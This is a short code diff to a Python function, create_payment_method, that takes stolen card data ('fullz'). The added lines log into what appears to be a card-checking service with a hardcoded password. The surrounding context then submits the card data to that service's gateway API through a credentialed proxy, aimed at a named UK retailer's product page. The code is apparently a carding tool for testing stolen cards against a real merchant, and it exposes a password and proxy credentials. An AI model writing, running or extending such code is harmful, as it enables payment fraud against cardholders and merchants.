@@ -91,6 +91,19 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "user-agent": users,
         }
 
+        response = await session.get('https://ayanochk.vip/login.php', headers=headers)
+
+        data = {
+            'password': 'jesprada12reborn',
+        }
+        
+        response = await session.post('https://ayanochk.vip/login.php', headers=headers, data=data)
+
+        response = await session.get('https://ayanochk.vip/index.php', headers=headers)
+
+        
+        
+
         final = await session.get(
             f'https://ayanochk.vip/api/ppcpgatewayccn.php?lista={fullz}&proxy=178.128.69.159:31114:oc-045bd5bf215c66a611bed69974d9892d1715b3242d6ae48965c9989272c520c9:qrewlq6ifcv4&sites=https://tinyfragrances.co.uk/product/courreges-c/&xlite=undefined',
             headers=headers,
